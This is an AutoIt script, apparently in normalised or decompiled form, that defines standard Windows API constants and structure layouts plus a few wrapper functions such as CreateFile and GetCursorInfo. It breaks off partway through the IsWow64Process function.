Global Const $str_regexpmatch = 0x0
Global Const $str_regexparraymatch = 0x1
Global Const $str_regexparrayfullmatch = 0x2
Global Const $str_regexparrayglobalmatch = 0x3
Global Const $str_regexparrayglobalfullmatch = 0x4
Global Const $str_endisstart = 0x0
Global Const $str_endnotstart = 0x1
Global Const $sb_ansi = 0x1
Global Const $sb_utf16le = 0x2
Global Const $sb_utf16be = 0x3
Global Const $sb_utf8 = 0x4
Global Const $se_utf16 = 0x0
Global Const $se_ansi = 0x1
Global Const $se_utf8 = 0x2
Global Const $str_utf16 = 0x0
Global Const $str_ucs2 = 0x1
Global Const $tagpoint = "struct;long X;long Y;endstruct"
Global Const $tagrect = "struct;long Left;long Top;long Right;long Bottom;endstruct"
Global Const $tagsize = "struct;long X;long Y;endstruct"
Global Const $tagmargins = "int cxLeftWidth;int cxRightWidth;int cyTopHeight;int cyBottomHeight"
Global Const $tagfiletime = "struct;dword Lo;dword Hi;endstruct"
Global Const $tagsystemtime = "struct;word Year;word Month;word Dow;word Day;word Hour;word Minute;word Second;word MSeconds;endstruct"
Global Const $tagtime_zone_information = "struct;long Bias;wchar StdName[32];word StdDate[8];long StdBias;wchar DayName[32];word DayDate[8];long DayBias;endstruct"
Global Const $tagnmhdr = "struct;hwnd hWndFrom;uint_ptr IDFrom;INT Code;endstruct"
Global Const $tagcomboboxexitem = "uint Mask;int_ptr Item;ptr Text;int TextMax;int Image;int SelectedImage;int OverlayImage;" & "int Indent;lparam Param"
Global Const $tagnmcbedragbegin = $tagnmhdr & ";int ItemID;wchar szText[260]"
Global Const $tagnmcbeendedit = $tagnmhdr & ";bool fChanged;int NewSelection;wchar szText[260];int Why"
Global Const $tagnmcomboboxex = $tagnmhdr & ";uint Mask;int_ptr Item;ptr Text;int TextMax;int Image;" & "int SelectedImage;int OverlayImage;int Indent;lparam Param"
Global Const $tagdtprange = "word MinYear;word MinMonth;word MinDOW;word MinDay;word MinHour;word MinMinute;" & "word MinSecond;word MinMSecond;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;" & "word MaxMinute;word MaxSecond;word MaxMSecond;bool MinValid;bool MaxValid"
Global Const $tagnmdatetimechange = $tagnmhdr & ";dword Flag;" & $tagsystemtime
Global Const $tagnmdatetimeformat = $tagnmhdr & ";ptr Format;" & $tagsystemtime & ";ptr pDisplay;wchar Display[64]"
Global Const $tagnmdatetimeformatquery = $tagnmhdr & ";ptr Format;struct;long SizeX;long SizeY;endstruct"
Global Const $tagnmdatetimekeydown = $tagnmhdr & ";int VirtKey;ptr Format;" & $tagsystemtime
Global Const $tagnmdatetimestring = $tagnmhdr & ";ptr UserString;" & $tagsystemtime & ";dword Flags"
Global Const $tageventlogrecord = "dword Length;dword Reserved;dword RecordNumber;dword TimeGenerated;dword TimeWritten;dword EventID;" & "word EventType;word NumStrings;word EventCategory;word ReservedFlags;dword ClosingRecordNumber;dword StringOffset;" & "dword UserSidLength;dword UserSidOffset;dword DataLength;dword DataOffset"
Global Const $taggdip_effectparams_blur = "float Radius; bool ExpandEdge"
Global Const $taggdip_effectparams_brightnesscontrast = "int BrightnessLevel; int ContrastLevel"
Global Const $taggdip_effectparams_colorbalance = "int CyanRed; int MagentaGreen; int YellowBlue"
Global Const $taggdip_effectparams_colorcurve = "int Adjustment; int Channel; int AdjustValue"
Global Const $taggdip_effectparams_colorlut = "byte LutB[256]; byte LutG[256]; byte LutR[256]; byte LutA[256]"
Global Const $taggdip_effectparams_huesaturationlightness = "int HueLevel; int SaturationLevel; int LightnessLevel"
Global Const $taggdip_effectparams_levels = "int Highlight; int Midtone; int Shadow"
Global Const $taggdip_effectparams_redeyecorrection = "uint NumberOfAreas; ptr Areas"
Global Const $taggdip_effectparams_sharpen = "float Radius; float Amount"
Global Const $taggdip_effectparams_tint = "int Hue; int Amount"
Global Const $taggdipbitmapdata = "uint Width;uint Height;int Stride;int Format;ptr Scan0;uint_ptr Reserved"
Global Const $taggdipcolormatrix = "float m[25]"
Global Const $taggdipencoderparam = "struct;byte GUID[16];ulong NumberOfValues;ulong Type;ptr Values;endstruct"
Global Const $taggdipencoderparams = "uint Count;" & $taggdipencoderparam
Global Const $taggdiprectf = "struct;float X;float Y;float Width;float Height;endstruct"
Global Const $taggdipstartupinput = "uint Version;ptr Callback;bool NoThread;bool NoCodecs"
Global Const $taggdipstartupoutput = "ptr HookProc;ptr UnhookProc"
Global Const $taggdipimagecodecinfo = "byte CLSID[16];byte FormatID[16];ptr CodecName;ptr DllName;ptr FormatDesc;ptr FileExt;" & "ptr MimeType;dword Flags;dword Version;dword SigCount;dword SigSize;ptr SigPattern;ptr SigMask"
Global Const $taggdippencoderparams = "uint Count;byte Params[1]"
Global Const $taghditem = "uint Mask;int XY;ptr Text;handle hBMP;int TextMax;int Fmt;lparam Param;int Image;int Order;uint Type;ptr pFilter;uint State"
Global Const $tagnmhddispinfo = $tagnmhdr & ";int Item;uint Mask;ptr Text;int TextMax;int Image;lparam lParam"
Global Const $tagnmhdfilterbtnclick = $tagnmhdr & ";int Item;" & $tagrect
Global Const $tagnmheader = $tagnmhdr & ";int Item;int Button;ptr pItem"
Global Const $taggetipaddress = "byte Field4;byte Field3;byte Field2;byte Field1"
Global Const $tagnmipaddress = $tagnmhdr & ";int Field;int Value"
Global Const $taglvfindinfo = "struct;uint Flags;ptr Text;lparam Param;" & $tagpoint & ";uint Direction;endstruct"
Global Const $taglvhittestinfo = $tagpoint & ";uint Flags;int Item;int SubItem;int iGroup"
Global Const $taglvitem = "struct;uint Mask;int Item;int SubItem;uint State;uint StateMask;ptr Text;int TextMax;int Image;lparam Param;" & "int Indent;int GroupID;uint Columns;ptr pColumns;ptr piColFmt;int iGroup;endstruct"
Global Const $tagnmlistview = $tagnmhdr & ";int Item;int SubItem;uint NewState;uint OldState;uint Changed;" & "struct;long ActionX;long ActionY;endstruct;lparam Param"
Global Const $tagnmlvcustomdraw = "struct;" & $tagnmhdr & ";dword dwDrawStage;handle hdc;" & $tagrect & ";dword_ptr dwItemSpec;uint uItemState;lparam lItemlParam;endstruct" & ";dword clrText;dword clrTextBk;int iSubItem;dword dwItemType;dword clrFace;int iIconEffect;" & "int iIconPhase;int iPartID;int iStateID;struct;long TextLeft;long TextTop;long TextRight;long TextBottom;endstruct;uint uAlign"
Global Const $tagnmlvdispinfo = $tagnmhdr & ";" & $taglvitem
Global Const $tagnmlvfinditem = $tagnmhdr & ";int Start;" & $taglvfindinfo
Global Const $tagnmlvgetinfotip = $tagnmhdr & ";dword Flags;ptr Text;int TextMax;int Item;int SubItem;lparam lParam"
Global Const $tagnmitemactivate = $tagnmhdr & ";int Index;int SubItem;uint NewState;uint OldState;uint Changed;" & $tagpoint & ";lparam lParam;uint KeyFlags"
Global Const $tagnmlvkeydown = $tagnmhdr & ";align 2;word VKey;uint Flags"
Global Const $tagnmlvscroll = $tagnmhdr & ";int DX;int DY"
Global Const $tagmchittestinfo = "uint Size;" & $tagpoint & ";uint Hit;" & $tagsystemtime & ";" & $tagrect & ";int iOffset;int iRow;int iCol"
Global Const $tagmcmonthrange = "word MinYear;word MinMonth;word MinDOW;word MinDay;word MinHour;word MinMinute;word MinSecond;" & "word MinMSeconds;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;word MaxMinute;word MaxSecond;" & "word MaxMSeconds;short Span"
Global Const $tagmcrange = "word MinYear;word MinMonth;word MinDOW;word MinDay;word MinHour;word MinMinute;word MinSecond;" & "word MinMSeconds;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;word MaxMinute;word MaxSecond;" & "word MaxMSeconds;short MinSet;short MaxSet"
Global Const $tagmcselrange = "word MinYear;word MinMonth;word MinDOW;word MinDay;word MinHour;word MinMinute;word MinSecond;" & "word MinMSeconds;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;word MaxMinute;word MaxSecond;" & "word MaxMSeconds"
Global Const $tagnmdaystate = $tagnmhdr & ";" & $tagsystemtime & ";int DayState;ptr pDayState"
Global Const $tagnmselchange = $tagnmhdr & ";struct;word BegYear;word BegMonth;word BegDOW;word BegDay;word BegHour;word BegMinute;word BegSecond;word BegMSeconds;endstruct;" & "struct;word EndYear;word EndMonth;word EndDOW;word EndDay;word EndHour;word EndMinute;word EndSecond;word EndMSeconds;endstruct"
Global Const $tagnmobjectnotify = $tagnmhdr & ";int Item;ptr piid;ptr pObject;long Result;dword dwFlags"
Global Const $tagnmtckeydown = $tagnmhdr & ";align 2;word VKey;uint Flags"
Global Const $tagtvitem = "struct;uint Mask;handle hItem;uint State;uint StateMask;ptr Text;int TextMax;int Image;int SelectedImage;" & "int Children;lparam Param;endstruct"
Global Const $tagtvitemex = "struct;" & $tagtvitem & ";int Integral;uint uStateEx;hwnd hwnd;int iExpandedImage;int iReserved;endstruct"
Global Const $tagnmtreeview = $tagnmhdr & ";uint Action;" & "struct;uint OldMask;handle OldhItem;uint OldState;uint OldStateMask;" & "ptr OldText;int OldTextMax;int OldImage;int OldSelectedImage;int OldChildren;lparam OldParam;endstruct;" & "struct;uint NewMask;handle NewhItem;uint NewState;uint NewStateMask;" & "ptr NewText;int NewTextMax;int NewImage;int NewSelectedImage;int NewChildren;lparam NewParam;endstruct;" & "struct;long PointX;long PointY;endstruct"
Global Const $tagnmtvcustomdraw = "struct;" & $tagnmhdr & ";dword DrawStage;handle HDC;" & $tagrect & ";dword_ptr ItemSpec;uint ItemState;lparam ItemParam;endstruct" & ";dword ClrText;dword ClrTextBk;int Level"
Global Const $tagnmtvdispinfo = $tagnmhdr & ";" & $tagtvitem
Global Const $tagnmtvgetinfotip = $tagnmhdr & ";ptr Text;int TextMax;handle hItem;lparam lParam"
Global Const $tagnmtvitemchange = $tagnmhdr & ";uint Changed;handle hItem;uint StateNew;uint StateOld;lparam lParam;"
Global Const $tagtvhittestinfo = $tagpoint & ";uint Flags;handle Item"
Global Const $tagnmtvkeydown = $tagnmhdr & ";align 2;word VKey;uint Flags"
Global Const $tagnmmouse = $tagnmhdr & ";dword_ptr ItemSpec;dword_ptr ItemData;" & $tagpoint & ";lparam HitInfo"
Global Const $tagtoken_privileges = "dword Count;align 4;int64 LUID;dword Attributes"
Global Const $tagimageinfo = "handle hBitmap;handle hMask;int Unused1;int Unused2;" & $tagrect
Global Const $tagmenuinfo = "dword Size;INT Mask;dword Style;uint YMax;handle hBack;dword ContextHelpID;ulong_ptr MenuData"
Global Const $tagmenuiteminfo = "uint Size;uint Mask;uint Type;uint State;uint ID;handle SubMenu;handle BmpChecked;handle BmpUnchecked;" & "ulong_ptr ItemData;ptr TypeData;uint CCH;handle BmpItem"
Global Const $tagrebarbandinfo = "uint cbSize;uint fMask;uint fStyle;dword clrFore;dword clrBack;ptr lpText;uint cch;" & "int iImage;hwnd hwndChild;uint cxMinChild;uint cyMinChild;uint cx;handle hbmBack;uint wID;uint cyChild;uint cyMaxChild;" & "uint cyIntegral;uint cxIdeal;lparam lParam;uint cxHeader" & ((@OSVersion = "WIN_XP") ? "" : ";" & $tagrect & ";uint uChevronState")
Global Const $tagnmrebarautobreak = $tagnmhdr & ";uint uBand;uint wID;lparam lParam;uint uMsg;uint fStyleCurrent;bool fAutoBreak"
Global Const $tagnmrbautosize = $tagnmhdr & ";bool fChanged;" & "struct;long TargetLeft;long TargetTop;long TargetRight;long TargetBottom;endstruct;" & "struct;long ActualLeft;long ActualTop;long ActualRight;long ActualBottom;endstruct"
Global Const $tagnmrebar = $tagnmhdr & ";dword dwMask;uint uBand;uint fStyle;uint wID;lparam lParam"
Global Const $tagnmrebarchevron = $tagnmhdr & ";uint uBand;uint wID;lparam lParam;" & $tagrect & ";lparam lParamNM"
Global Const $tagnmrebarchildsize = $tagnmhdr & ";uint uBand;uint wID;" & "struct;long CLeft;long CTop;long CRight;long CBottom;endstruct;" & "struct;long BLeft;long BTop;long BRight;long BBottom;endstruct"
Global Const $tagcolorscheme = "dword Size;dword BtnHighlight;dword BtnShadow"
Global Const $tagnmtoolbar = $tagnmhdr & ";int iItem;" & "struct;int iBitmap;int idCommand;byte fsState;byte fsStyle;dword_ptr dwData;int_ptr iString;endstruct" & ";int cchText;ptr pszText;" & $tagrect
Global Const $tagnmtbhotitem = $tagnmhdr & ";int idOld;int idNew;dword dwFlags"
Global Const $tagtbbutton = "int Bitmap;int Command;byte State;byte Style;dword_ptr Param;int_ptr String"
Global Const $tagtbbuttoninfo = "uint Size;dword Mask;int Command;int Image;byte State;byte Style;word CX;dword_ptr Param;ptr Text;int TextMax"
Global Const $tagnetresource = "dword Scope;dword Type;dword DisplayType;dword Usage;ptr LocalName;ptr RemoteName;ptr Comment;ptr Provider"
Global Const $tagoverlapped = "ulong_ptr Internal;ulong_ptr InternalHigh;struct;dword Offset;dword OffsetHigh;endstruct;handle hEvent"
Global Const $tagopenfilename = "dword StructSize;hwnd hwndOwner;handle hInstance;ptr lpstrFilter;ptr lpstrCustomFilter;" & "dword nMaxCustFilter;dword nFilterIndex;ptr lpstrFile;dword nMaxFile;ptr lpstrFileTitle;dword nMaxFileTitle;" & "ptr lpstrInitialDir;ptr lpstrTitle;dword Flags;word nFileOffset;word nFileExtension;ptr lpstrDefExt;lparam lCustData;" & "ptr lpfnHook;ptr lpTemplateName;ptr pvReserved;dword dwReserved;dword FlagsEx"
Global Const $tagbitmapinfoheader = "struct;dword biSize;long biWidth;long biHeight;word biPlanes;word biBitCount;" & "dword biCompression;dword biSizeImage;long biXPelsPerMeter;long biYPelsPerMeter;dword biClrUsed;dword biClrImportant;endstruct"
Global Const $tagbitmapinfo = $tagbitmapinfoheader & ";dword biRGBQuad[1]"
Global Const $tagblendfunction = "byte Op;byte Flags;byte Alpha;byte Format"
Global Const $tagguid = "struct;ulong Data1;ushort Data2;ushort Data3;byte Data4[8];endstruct"
Global Const $tagwindowplacement = "uint length;uint flags;uint showCmd;long ptMinPosition[2];long ptMaxPosition[2];long rcNormalPosition[4]"
Global Const $tagwindowpos = "hwnd hWnd;hwnd InsertAfter;int X;int Y;int CX;int CY;uint Flags"
Global Const $tagscrollinfo = "uint cbSize;uint fMask;int nMin;int nMax;uint nPage;int nPos;int nTrackPos"
Global Const $tagscrollbarinfo = "dword cbSize;" & $tagrect & ";int dxyLineButton;int xyThumbTop;" & "int xyThumbBottom;int reserved;dword rgstate[6]"
Global Const $taglogfont = "struct;long Height;long Width;long Escapement;long Orientation;long Weight;byte Italic;byte Underline;" & "byte Strikeout;byte CharSet;byte OutPrecision;byte ClipPrecision;byte Quality;byte PitchAndFamily;wchar FaceName[32];endstruct"
Global Const $tagkbdllhookstruct = "dword vkCode;dword scanCode;dword flags;dword time;ulong_ptr dwExtraInfo"
Global Const $tagprocess_information = "handle hProcess;handle hThread;dword ProcessID;dword ThreadID"
Global Const $tagstartupinfo = "dword Size;ptr Reserved1;ptr Desktop;ptr Title;dword X;dword Y;dword XSize;dword YSize;dword XCountChars;" & "dword YCountChars;dword FillAttribute;dword Flags;word ShowWindow;word Reserved2;ptr Reserved3;handle StdInput;" & "handle StdOutput;handle StdError"
Global Const $tagsecurity_attributes = "dword Length;ptr Descriptor;bool InheritHandle"
Global Const $tagwin32_find_data = "dword dwFileAttributes;dword ftCreationTime[2];dword ftLastAccessTime[2];dword ftLastWriteTime[2];dword nFileSizeHigh;dword nFileSizeLow;dword dwReserved0;dword dwReserved1;wchar cFileName[260];wchar cAlternateFileName[14]"
Global Const $tagtextmetric = "long tmHeight;long tmAscent;long tmDescent;long tmInternalLeading;long tmExternalLeading;" & "long tmAveCharWidth;long tmMaxCharWidth;long tmWeight;long tmOverhang;long tmDigitizedAspectX;long tmDigitizedAspectY;" & "wchar tmFirstChar;wchar tmLastChar;wchar tmDefaultChar;wchar tmBreakChar;byte tmItalic;byte tmUnderlined;byte tmStruckOut;" & "byte tmPitchAndFamily;byte tmCharSet"
Global Const $opt_coordsrelative = 0x0
Global Const $opt_coordsabsolute = 0x1
Global Const $opt_coordsclient = 0x2
Global Const $opt_errorsilent = 0x0
Global Const $opt_errorfatal = 0x1
Global Const $opt_capsnostore = 0x0
Global Const $opt_capsstore = 0x1
Global Const $opt_matchstart = 0x1
Global Const $opt_matchany = 0x2
Global Const $opt_matchexact = 0x3
Global Const $opt_matchadvanced = 0x4
Global Const $ccs_top = 0x1
Global Const $ccs_nomovey = 0x2
Global Const $ccs_bottom = 0x3
Global Const $ccs_noresize = 0x4
Global Const $ccs_noparentalign = 0x8
Global Const $ccs_nohilite = 0x10
Global Const $ccs_adjustable = 0x20
Global Const $ccs_nodivider = 0x40
Global Const $ccs_vert = 0x80
Global Const $ccs_left = 0x81
Global Const $ccs_nomovex = 0x82
Global Const $ccs_right = 0x83
Global Const $dt_drivetype = 0x1
Global Const $dt_ssdstatus = 0x2
Global Const $dt_bustype = 0x3
Global Const $proxy_ie = 0x0
Global Const $proxy_none = 0x1
Global Const $proxy_specified = 0x2
Global Const $objid_window = 0x0
Global Const $objid_titlebar = 0xfffffffe
Global Const $objid_sizegrip = 0xfffffff9
Global Const $objid_caret = 0xfffffff8
Global Const $objid_cursor = 0xfffffff7
Global Const $objid_alert = 0xfffffff6
Global Const $objid_sound = 0xfffffff5
Global Const $dlg_centerontop = 0x0
Global Const $dlg_notitle = 0x1
Global Const $dlg_notontop = 0x2
Global Const $dlg_textleft = 0x4
Global Const $dlg_textright = 0x8
Global Const $dlg_moveable = 0x10
Global Const $dlg_textvcenter = 0x20
Global Const $mcid_unknown = +0xffffffff
Global Const $mcid_hand = 0x0
Global Const $mcid_appstarting = 0x1
Global Const $mcid_arrow = 0x2
Global Const $mcid_cross = 0x3
Global Const $mcid_help = 0x4
Global Const $mcid_ibeam = 0x5
Global Const $mcid_icon = 0x6
Global Const $mcid_no = 0x7
Global Const $mcid_size = 0x8
Global Const $mcid_sizeall = 0x9
Global Const $mcid_sizenesw = 0xa
Global Const $mcid_sizens = 0xb
Global Const $mcid_sizenwse = 0xc
Global Const $mcid_sizewe = 0xd
Global Const $mcid_uparrow = 0xe
Global Const $mcid_wait = 0xf
Global Const $mcid_none = 0x10
Global Const $sd_logoff = 0x0
Global Const $sd_shutdown = 0x1
Global Const $sd_reboot = 0x2
Global Const $sd_force = 0x4
Global Const $sd_powerdown = 0x8
Global Const $sd_forcehung = 0x10
Global Const $sd_standby = 0x20
Global Const $sd_hibernate = 0x40
Global Const $stdin_child = 0x1
Global Const $stdout_child = 0x2
Global Const $stderr_child = 0x4
Global Const $stderr_merged = 0x8
Global Const $stdio_inherit_parent = 0x10
Global Const $run_create_new_console = 0x10000
Global Const $ubound_dimensions = 0x0
Global Const $ubound_rows = 0x1
Global Const $ubound_columns = 0x2
Global Const $mouseeventf_absolute = 0x8000
Global Const $mouseeventf_move = 0x1
Global Const $mouseeventf_leftdown = 0x2
Global Const $mouseeventf_leftup = 0x4
Global Const $mouseeventf_rightdown = 0x8
Global Const $mouseeventf_rightup = 0x10
Global Const $mouseeventf_middledown = 0x20
Global Const $mouseeventf_middleup = 0x40
Global Const $mouseeventf_wheel = 0x800
Global Const $mouseeventf_xdown = 0x80
Global Const $mouseeventf_xup = 0x100
Global Const $reg_none = 0x0
Global Const $reg_sz = 0x1
Global Const $reg_expand_sz = 0x2
Global Const $reg_binary = 0x3
Global Const $reg_dword = 0x4
Global Const $reg_dword_little_endian = 0x4
Global Const $reg_dword_big_endian = 0x5
Global Const $reg_link = 0x6
Global Const $reg_multi_sz = 0x7
Global Const $reg_resource_list = 0x8
Global Const $reg_full_resource_descriptor = 0x9
Global Const $reg_resource_requirements_list = 0xa
Global Const $reg_qword = 0xb
Global Const $reg_qword_little_endian = 0xb
Global Const $hwnd_bottom = 0x1
Global Const $hwnd_notopmost = +0xfffffffe
Global Const $hwnd_top = 0x0
Global Const $hwnd_topmost = +0xffffffff
Global Const $swp_nosize = 0x1
Global Const $swp_nomove = 0x2
Global Const $swp_nozorder = 0x4
Global Const $swp_noredraw = 0x8
Global Const $swp_noactivate = 0x10
Global Const $swp_framechanged = 0x20
Global Const $swp_drawframe = 0x20
Global Const $swp_showwindow = 0x40
Global Const $swp_hidewindow = 0x80
Global Const $swp_nocopybits = 0x100
Global Const $swp_noownerzorder = 0x200
Global Const $swp_noreposition = 0x200
Global Const $swp_nosendchanging = 0x400
Global Const $swp_defererase = 0x2000
Global Const $swp_asyncwindowpos = 0x4000
Global Const $keyword_default = 0x1
Global Const $keyword_null = 0x2
Global Const $declared_local = +0xffffffff
Global Const $declared_unknown = 0x0
Global Const $declared_global = 0x1
Global Const $assign_create = 0x0
Global Const $assign_forcelocal = 0x1
Global Const $assign_forceglobal = 0x2
Global Const $assign_existfail = 0x4
Global Const $bi_enable = 0x0
Global Const $bi_disable = 0x1
Global Const $break_enable = 0x1
Global Const $break_disable = 0x0
Global Const $cdtray_open = "open"
Global Const $cdtray_closed = "closed"
Global Const $send_default = 0x0
Global Const $send_raw = 0x1
Global Const $dir_default = 0x0
Global Const $dir_extended = 0x1
Global Const $dir_norecurse = 0x2
Global Const $dir_remove = 0x1
Global Const $dt_all = "ALL"
Global Const $dt_cdrom = "CDROM"
Global Const $dt_removable = "REMOVABLE"
Global Const $dt_fixed = "FIXED"
Global Const $dt_network = "NETWORK"
Global Const $dt_ramdisk = "RAMDISK"
Global Const $dt_unknown = "UNKNOWN"
Global Const $dt_undefined = 0x1
Global Const $dt_fat = "FAT"
Global Const $dt_fat32 = "FAT32"
Global Const $dt_exfat = "exFAT"
Global Const $dt_ntfs = "NTFS"
Global Const $dt_nwfs = "NWFS"
Global Const $dt_cdfs = "CDFS"
Global Const $dt_udf = "UDF"
Global Const $dma_default = 0x0
Global Const $dma_persistent = 0x1
Global Const $dma_authentication = 0x8
Global Const $ds_unknown = "UNKNOWN"
Global Const $ds_ready = "READY"
Global Const $ds_notready = "NOTREADY"
Global Const $ds_invalid = "INVALID"
Global Const $mouse_click_left = "left"
Global Const $mouse_click_right = "right"
Global Const $mouse_click_middle = "middle"
Global Const $mouse_click_main = "main"
Global Const $mouse_click_menu = "menu"
Global Const $mouse_click_primary = "primary"
Global Const $mouse_click_secondary = "secondary"
Global Const $mouse_wheel_up = "up"
Global Const $mouse_wheel_down = "down"
Global Const $number_auto = 0x0
Global Const $number_32bit = 0x1
Global Const $number_64bit = 0x2
Global Const $number_double = 0x3
Global Const $obj_name = 0x1
Global Const $obj_string = 0x2
Global Const $obj_progid = 0x3
Global Const $obj_file = 0x4
Global Const $obj_module = 0x5
Global Const $obj_clsid = 0x6
Global Const $obj_iid = 0x7
Global Const $exitclose_normal = 0x0
Global Const $exitclose_byexit = 0x1
Global Const $exitclose_byclick = 0x2
Global Const $exitclose_bylogoff = 0x3
Global Const $exitclose_byshutdown = 0x4
Global Const $process_stats_memory = 0x0
Global Const $process_stats_io = 0x1
Global Const $process_low = 0x0
Global Const $process_belownormal = 0x1
Global Const $process_normal = 0x2
Global Const $process_abovenormal = 0x3
Global Const $process_high = 0x4
Global Const $process_realtime = 0x5
Global Const $run_logon_noprofile = 0x0
Global Const $run_logon_profile = 0x1
Global Const $run_logon_network = 0x2
Global Const $run_logon_inherit = 0x4
Global Const $sound_nowait = 0x0
Global Const $sound_wait = 0x1
Global Const $shex_open = "open"
Global Const $shex_edit = "edit"
Global Const $shex_print = "print"
Global Const $shex_properties = "properties"
Global Const $tcp_data_default = 0x0
Global Const $tcp_data_binary = 0x1
Global Const $udp_open_default = 0x0
Global Const $udp_open_broadcast = 0x1
Global Const $udp_data_default = 0x0
Global Const $udp_data_binary = 0x1
Global Const $udp_data_array = 0x2
Global Const $tip_noicon = 0x0
Global Const $tip_infoicon = 0x1
Global Const $tip_warningicon = 0x2
Global Const $tip_erroricon = 0x3
Global Const $tip_balloon = 0x1
Global Const $tip_center = 0x2
Global Const $tip_forcevisible = 0x4
Global Const $windows_noontop = 0x0
Global Const $windows_ontop = 0x1
Global Const $win_state_exists = 0x1
Global Const $win_state_visible = 0x2
Global Const $win_state_enabled = 0x4
Global Const $win_state_active = 0x8
Global Const $win_state_minimized = 0x10
Global Const $win_state_maximized = 0x20
#Region Global Variables and Constants
Global $__g_venum, $__g_vext = 0x0
Global $__g_irgbmode = 0x1
Global Const $tagosversioninfo = "struct;dword OSVersionInfoSize;dword MajorVersion;dword MinorVersion;dword BuildNumber;dword PlatformId;wchar CSDVersion[128];endstruct"
Global Const $image_bitmap = 0x0
Global Const $image_icon = 0x1
Global Const $image_cursor = 0x2
Global Const $image_enhmetafile = 0x3
Global Const $lr_defaultcolor = 0x0
Global Const $lr_monochrome = 0x1
Global Const $lr_color = 0x2
Global Const $lr_copyreturnorg = 0x4
Global Const $lr_copydeleteorg = 0x8
Global Const $lr_loadfromfile = 0x10
Global Const $lr_loadtransparent = 0x20
Global Const $lr_defaultsize = 0x40
Global Const $lr_vgacolor = 0x80
Global Const $lr_loadmap3dcolors = 0x1000
Global Const $lr_createdibsection = 0x2000
Global Const $lr_copyfromresource = 0x4000
Global Const $lr_shared = 0x8000
Global Const $__tagcursorinfo = "dword Size;dword Flags;handle hCursor;" & "struct;long X;long Y;endstruct"
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
#Region Public Functions
Func _WinAPI_CreateFile($sfilename, $icreation, $iaccess = 0x4, $ishare = 0x0, $iattributes = 0x0, $tsecurity = 0x0)
    Local $ida = 0x0, $ism = 0x0, $icd = 0x0, $ifa = 0x0
    If BitAND($iaccess, 0x1) <> 0x0 Then $ida = BitOR($ida, $generic_execute)
    If BitAND($iaccess, 0x2) <> 0x0 Then $ida = BitOR($ida, $generic_read)
    If BitAND($iaccess, 0x4) <> 0x0 Then $ida = BitOR($ida, $generic_write)
    If BitAND($ishare, 0x1) <> 0x0 Then $ism = BitOR($ism, $file_share_delete)
    If BitAND($ishare, 0x2) <> 0x0 Then $ism = BitOR($ism, $file_share_read)
    If BitAND($ishare, 0x4) <> 0x0 Then $ism = BitOR($ism, $file_share_write)
    Switch $icreation
        Case 0x0
            $icd = $create_new
        Case 0x1
            $icd = $create_always
        Case 0x2
            $icd = $open_existing
        Case 0x3
            $icd = $open_always
        Case 0x4
            $icd = $truncate_existing
    EndSwitch
    If BitAND($iattributes, 0x1) <> 0x0 Then $ifa = BitOR($ifa, $file_attribute_archive)
    If BitAND($iattributes, 0x2) <> 0x0 Then $ifa = BitOR($ifa, $file_attribute_hidden)
    If BitAND($iattributes, 0x4) <> 0x0 Then $ifa = BitOR($ifa, $file_attribute_readonly)
    If BitAND($iattributes, 0x8) <> 0x0 Then $ifa = BitOR($ifa, $file_attribute_system)
    Local $acall = DllCall("kernel32.dll", "handle", "CreateFileW", "wstr", $sfilename, "dword", $ida, "dword", $ism, "struct*", $tsecurity, "dword", $icd, "dword", $ifa, "ptr", 0x0)
    If @error Or ($acall[0x0] = Ptr(+0xffffffff)) Then Return SetError(@error, @extended, 0x0)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_CREATEFILE
Func _WinAPI_FreeLibrary($hmodule)
    Local $acall = DllCall("kernel32.dll", "bool", "FreeLibrary", "handle", $hmodule)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_FREELIBRARY
Func _WinAPI_GetCursorInfo()
    Local $tcursor = DllStructCreate($__tagcursorinfo)
    Local $icursor = DllStructGetSize($tcursor)
    DllStructSetData($tcursor, "Size", $icursor)
    Local $acall = DllCall("user32.dll", "bool", "GetCursorInfo", "struct*", $tcursor)
    If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
    Local $acursor[0x5]
    $acursor[0x0] = True
    $acursor[0x1] = DllStructGetData($tcursor, "Flags") <> 0x0
    $acursor[0x2] = DllStructGetData($tcursor, "hCursor")
    $acursor[0x3] = DllStructGetData($tcursor, "X")
    $acursor[0x4] = DllStructGetData($tcursor, "Y")
    Return $acursor
EndFunc   ;==>_WINAPI_GETCURSORINFO
Func _WinAPI_GetDlgCtrlID($hwnd)
    Local $acall = DllCall("user32.dll", "int", "GetDlgCtrlID", "hwnd", $hwnd)
    If @error Then Return SetError(@error, @extended, 0x0)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_GETDLGCTRLID
Func _WinAPI_GetModuleHandle($smodulename)
    If $smodulename = "" Then $smodulename = Null
    Local $acall = DllCall("kernel32.dll", "handle", "GetModuleHandleW", "wstr", $smodulename)
    If @error Then Return SetError(@error, @extended, 0x0)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_GETMODULEHANDLE
Func _WinAPI_GetString($pstring, $bunicode = True)
    Local $ilength = _WinAPI_StrLen($pstring, $bunicode)
    If @error Or Not $ilength Then Return SetError(@error + 0xa, @extended, "")
    Local $tstring = DllStructCreate(($bunicode ? "wchar" : "char") & "[" & ($ilength + 0x1) & "]", $pstring)
    If @error Then Return SetError(@error, @extended, "")
    Return SetExtended($ilength, DllStructGetData($tstring, 0x1))
EndFunc   ;==>_WINAPI_GETSTRING
Func _WinAPI_GetVersion()
    Local $tosvi = DllStructCreate($tagosversioninfo)
    DllStructSetData($tosvi, 0x1, DllStructGetSize($tosvi))
    Local $acall = DllCall("kernel32.dll", "bool", "GetVersionExW", "struct*", $tosvi)
    If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, 0x0)
    Return Number(DllStructGetData($tosvi, 0x2) & "." & DllStructGetData($tosvi, 0x3), $number_double)
EndFunc   ;==>_WINAPI_GETVERSION
Func _WinAPI_IsWow64Process($ipid = 0x0)
    If Not $ipid Then $ipid = @AutoItPID
    Local $hprocess = DllCall("kernel32.dll", "handle", "OpenProcess", "dword", (_WinAPI_GetVersion() < 6 ? 0x400 : 0x1000), "bool", 0x0, "dword", $ipid)
